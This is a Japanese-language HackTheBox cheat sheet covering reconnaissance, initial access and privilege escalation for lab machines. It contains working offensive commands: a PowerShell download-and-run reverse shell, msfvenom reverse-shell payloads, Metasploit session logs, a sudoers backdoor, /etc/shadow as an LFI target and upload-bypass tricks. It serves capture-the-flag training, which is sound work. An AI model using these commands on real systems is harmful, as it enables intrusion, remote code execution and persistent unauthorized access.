# HackTheBox_CheatSheet

# 段階別対応
## 偵察(search) 
### 初めの一歩
ターゲットをhostsに入れ、ポート確認とディレクトリ検索を実施
```
TARGET=<IP>
echo "$TARGET <マシン名>.htb" >> /etc/hosts
rustscan -b 1000 ${TARGET} > rustscan.txt
gobuster dir -e -u ${TARGET} --wildcard  -w /usr/share/wordlists/dirb/common.txt > gobuster.txt
```

## (足がかり)Initial Footprint
### 実績ありポートとサービス(特別脆弱性を突いた例)
```
21/tcp:ftp
　接続して、適当なユーザで試す＋anonymousユーザ接続もあり　
　接続成功後はリバースシェル等モジュールを送り込める

　msfvenomを用いたペイロード作成＋Metasploitによるリバースシェル接続

21/tcp:ftp vsftpd 2.3.4
　→vsftpd 2.3.4 - Backdoor Command Executionの脆弱性あり

445/tcp:microsoft-ds
　MS08-057の脆弱性あり

139/tcp:netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp:netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
　Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution の脆弱性あり [SMB匿名接続](#小技色々)
```


### 着目すべきポート
```
80/tcp:http, 443/tcp:https
　->Webサイトにある脆弱性を確認する

135/tcp:MSRPC, 139/tcp:NetBios-SSN, 445/tcp:Microsoft-DS
　->Eternal Blueなどが使える　

21/tcp:ftp
　->anonymousユーザなどでファイルの中身を見たり、アップロードしたりできる

22/tcp:ssh
　->BruteForceにより突破できるかも

389, 636:LDAP
　->ActiveDirectoryに関する脆弱性があるかも
 
 ```
 
## その他ポート
```
22/tcp:ssh OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0
22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99)
23/tcp :telnet Linux telnetd
25/tcp :smtp Postfix smtpd
53/tcp :domain ISC BIND 9.7.0-P1
80/tcp :http Apache httpd 2.2.14 *1
80/tcp :http Apache httpd 2.0.52 *2
110/tcp:pop3 Dovecot pop3d
111/tcp:rpcbind 2 (RPC #100000)
139/tcp:netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp:imap Dovecot imapd
389/tcp:ldap OpenLDAP 2.2.X - 2.3.X
443/tcp:ssl/https?
445/tcp:netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp:exec netkit-rsh rexecd
513/tcp:login?
514/tcp:tcpwrapped
631/tcp:ipp CUPS 1.1
784/tcp:status 1 (RPC #100024)
901/tcp:http Samba SWAT administration server
993/tcp:ssl/imaps?
995/tcp:ssl/pop3s?
2000/tcp:sieve Dovecot timsieved
2049/tcp:nfs 2-4 (RPC #100003)
3306/tcp:mysql MySQL 5.1.73-0ubuntu0.10.04.1
3306/tcp:mysql MySQL (unauthorized)
3632/tcp:tcpwrapped
3632/tcp:distccd distccd v1 *3
6667/tcp:irc IRCnet ircd
8070/tcp:ucs-isc?
8080/tcp:http Apache Tomcat/Coyote JSP engine 1.1
10000/tcp:http MiniServ 0.01 (Webmin httpd)
 ```
 
### Webの確認ポイント
#### LFIの確認ポイント
以下は確認したことあり
```
/etc/passwd
/etc/shadow
/etc/amportal.conf(FreePBX)
/etc/my.cnf
```


## (一般権限奪取)user level privilege
### フォルダ/ファイルあさり
権限昇格を狙って探索を行う　
以下のファイルにOSの情報が記載されている
```
% cat /etc/*release
% cat /etc/redhat-release
% cat /etc/os-release

bash-3.00$ cat redhat-release
CentOS release 4.5 (Final)
```
ユーザ名を表示
```
% uname -r
2.6.31-14-generic-pae
```
(Windows) ユーザ名を表示
```
% mgetuid (Win)
Server username: NT AUTHORITY\SYSTEM
```

### Webシェル/リバースシェル
[リバースシェル置き場](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

pythonを用いたシェルアップグレード
```
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
```

### WindowsにおけるPowerShellのリバースシェル
```
Powershell.exe -NoP -NonI -W hidden -Exec Bypass IEX (New-Object Net,WebClient).DownloadString('http://<upload-Invoke-Shellcode.ps1>');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <IP> -Lport 80

```
参考）https://github.com/EmpireProject/Empire/blob/master/data/module_source/code_execution/Invoke-Shellcode.ps1 

### Meterpreterによるexploit確認
セッションを残した状態で、実行
```
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run 

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 30 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf5 post(multi/recon/local_exploit_suggester) >
``` 
 
## (特権昇格)privilege escalation
### 脆弱性を確認する手段
Linuxの場合、以下ツールを利用  
[LinEnum](https://github.com/rebootuser/LinEnum)　[詳細](#内部探査)  

Windowsの場合、以下ツールを利用  
[Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)　[詳細](#内部探査)  
 
### Kernel Exploit
以下コマンドでSUDO権限を確認
```
sudo -l
```

その後以下のサイトで検索し、SUDO実行時に権限昇格が行えるか確認  
[GTFOBins](https://gtfobins.github.io/)

# ツール色々
## ポート調査
### nmap
空いてるポート・サービス確認
```
nmap -sC -sV -Pn XX.XX.XX.XX
nmap -p 1-65535 XX.XX.XX.XX

絞ったのち
nmap -pXX,YY,ZZ -A XX.XX.XX.XX

SMB狙い撃ちとか
nmap --script smb-vuln* -p 139,445 10.10.10.14

UDPの確認
nmap -sU -v <host>
```

### rustscan
nmapを高速化したもの、ポート特定までやってnmapに引き渡し
```
rustscan -b 1000 10.10.10.197
```

## Web探索
### nikto
webサービスについて、ディレクトリ探査や脆弱性を確認できる
```
nikto -h XX.XX.XX.XX
```

### dirb
webサービスについて、ディレクトリ探査が可能、ネストも調べてくれるが遅い
```
dirb http://XX.XX.XX.XX
```

### gobuster
dirbと同様に、ディレクトリ総当たりだが1階層のみで早い
```
gobuster dir -e -u http://10.10.10.197:8080/ --wildcard  -w /usr/share/wordlists/dirb/common.txt
```

## 脆弱性確認
### searchsploit
脆弱性を検索できる
```
kali@kali:~/SyachinekoLab/workspace/HTB/Lame$ searchsploit samba 3.0.20
------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                    |  Path
                                                                                                                  | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                  | exploits/unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                             | exploits/linux/remote/7701.txt
------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
```

## Password Crack
### JohnTheRipper
パスワード解析
```
John
```


### fcrackzip
```
fcrackzip -u -p <passwdFile> <File>
fcrackzip -u -D -p <Dir/passwdFile> <File>
```

## パケット
### tshark
パケットを解析できる
```
$ tshark -r 0.pcap
```

## Exploit
### msfvenom
各種ペイロード等作成できる
リバースシェル用のペイロード作成例
```
kali@kali:~/SyachinekoLab/workspace/HTB/Devel$ msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o devel.aspx LHOST=10.10.14.9 LPORT=1234
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2834 bytes
Saved as: devel.aspx


Meterpreterを用いないでペイロード作成
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode
```

### metasploit
exploitツール
metapreterによるリバースシェル接続の例
```
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set LHOST 10.10.14.9
LHOST => 10.10.14.9
msf5 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.9:1234 
[*] Sending stage (180291 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.9:1234 -> 10.10.10.5:49163) at 2020-06-26 09:56:55 -0400

meterpreter > 

```
セッションをbackgroundコマンドで保持し、確認できる
```
meterpreter > background
[*] Backgrounding session 3...
msf5 exploit(multi/handler) > show sessions

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.9:1234 -> 10.10.10.5:49157 (10.10.10.5)
```

### meterpreter
専用シェル
```
meterpreter > background
[*] Backgrounding session 3...
msf5 exploit(multi/handler) > show sessions

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.9:1234 -> 10.10.10.5:49157 (10.10.10.5)
```


## 内部探査
### LinEnum
Linuxの内部探査をしてくれるツール
特に着目すべき部分
```
capabilities
cap_setuidが立っているものを確認し、GTFOBinsで権限昇格可能か確認 
```
[権限昇格](#(特権昇格)privilege escalation)

### Windows-Exploit-Suggester
Windowsの内部探査をしてくれるツール
特に着目すべき部分
```
sssss
```

## サービス探索
### wpscan
wordpressの内容把握に利用可能
wordpressはそのもののバージョンから脆弱性を探したり、wp-content/plugin配下の脆弱なプラグインを探したりする
```
wpscan --url <url> --enumerate p,u
```

## FireFox拡張機能
### FoxyProxy
簡易に切り替えられるProxy、BurpSuiteと組み合わせて使うことも
```
```

### Wappalyzer
サイトを構成するフレームワークなどを確認できるツール


# 小技色々
## SMB匿名接続
```
kali@kali:~$ rpcclient -U "" lame.htb
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
```

## ファイルアップロード
簡易サーバを立ち上げてwgetで受け取る
```
python -m SimpleHTTPServer
----------------------------
wget http://<IP>:8080/<fileName>
```

## PINGファイルをアップロードする方法色々
色々ある
```
拡張子を偽装
.ping.php

マジックバイトを仕込む

```

## sudoers書き換え
```
useradd test
passwd test
echo "test ALL=(ALL) ALL " >> /etc/sudoers
# これでsshができればバックドアとなる
```

## 改行コード変換
```
tr -d "\15" <fin >fout
```

## curlによるアクセス


# 知らないことリスト

# つらつらお勉強したことメモ

# 参考サイト
[MITRE 手法に迷ったら](https://attack.mitre.org/matrices/enterprise/)

# WriteUp
## HackTheBox
[Legacy](https://syachineko.hatenablog.com/entry/2020/06/21/163536)
[Lame](https://syachineko.hatenablog.com/entry/2020/06/16/231952)
[Devel](https://syachineko.hatenablog.com/entry/2020/06/27/230424)
[Cap](https://syachineko.hatenablog.com/entry/2021/10/16/202928)
[Beep](https://syachineko.hatenablog.com/entry/2022/05/02/144623)
Optimum
Popcorn
Jerry
Explore
Privise
Backdoor
Netmon
Bashed

